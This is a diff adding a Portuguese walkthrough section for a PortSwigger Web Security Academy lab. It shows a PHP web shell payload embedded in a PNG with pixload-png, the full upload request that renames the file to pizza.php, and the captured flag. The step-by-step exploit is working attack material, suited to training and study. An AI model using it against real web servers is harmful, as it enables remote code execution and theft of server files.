@@ -231,6 +231,82 @@ Ra1gXgVnwyebhHPsi3FWWSNBfY14epng
 ````
 
 ### >> 6. Remote code execution via polyglot web shell upload
-https://github.com/chinarulezzz/pixload/blob/master/README.md
+
 https://portswigger.net/web-security/file-upload#what-are-file-upload-vulnerabilities
 
+Crie um arquivo png contendo o payload `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+[pixload-ng](https://github.com/chinarulezzz/pixload/blob/master/README.md)
+````
+pixload-png  --payload "$(cat payload.php)" celebrating-pizza-6753651837109157-shdrk.png
+........ PNG Payload Creator/Injector .........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
+
+[>] Injecting payload into celebrating-pizza-6753651837109157-shdrk.png
+
+[+] Chunk size: 13
+[+] Chunk type: IHDR
+[+] CRC: 6643af0f
+[+] Chunk size: 765
+[+] Chunk type: PLTE
+[+] CRC: fc7fe17d
+[+] Chunk size: 255
+[+] Chunk type: tRNS
+[+] CRC: 075bbaa7
+[+] Chunk size: 11873
+[+] Chunk type: IDAT
+[+] CRC: 5dd0bbd5
+[+] Chunk size: 0
+[+] Chunk type: IEND
+
+[>] Inject payload to the new chunk: 'pUnk'
+[✔] Payload was injected successfully
+
+celebrating-pizza-6753651837109157-shdrk.png: PNG image data, 1315 x 138, 8-bit colormap, non-interlaced
+````
+Crie uma request para realizar o upload do png porém modifique o arquivo destino para php
+````
+POST /my-account/avatar HTTP/1.1
+Host: ac221ff21ebd3511c06727b0007c00c8.web-security-academy.net
+Cookie: session=qNvxxNuz60Dyc00afibMCuuJuGfIX8U3
+Content-Length: 26410
+Cache-Control: max-age=0
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://ac221ff21ebd3511c06727b0007c00c8.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx4cNCNmFY2Jv056y
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://ac221ff21ebd3511c06727b0007c00c8.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+------WebKitFormBoundaryx4cNCNmFY2Jv056y
+Content-Disposition: form-data; name="avatar"; filename="pizza.php"
+Content-Type: image/png
+
+PNG
+AÒ>gæíð±1ÆæH#\æùLñLfÇcí?]»6Á?äüücìãsEÆópMyyLMíå1Æ®üx®«=¿¹¶¶¶sc]æ|®
+Áì6Ü#0Æþ×<?php echo file_get_contents('/home/carlos/secret'); ?> 
+------WebKitFormBoundaryx4cNCNmFY2Jv056y
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryx4cNCNmFY2Jv056y
+Content-Disposition: form-data; name="csrf"
+
+wYlMxt6LbnTxYyM6MJLtc4yXLIbvJdh6
+------WebKitFormBoundaryx4cNCNmFY2Jv056y--
+````
+
+Flag: `e4X7zfE6kout4qJXeIl53uRdOZuF7e3r`
+
+### >> 7.
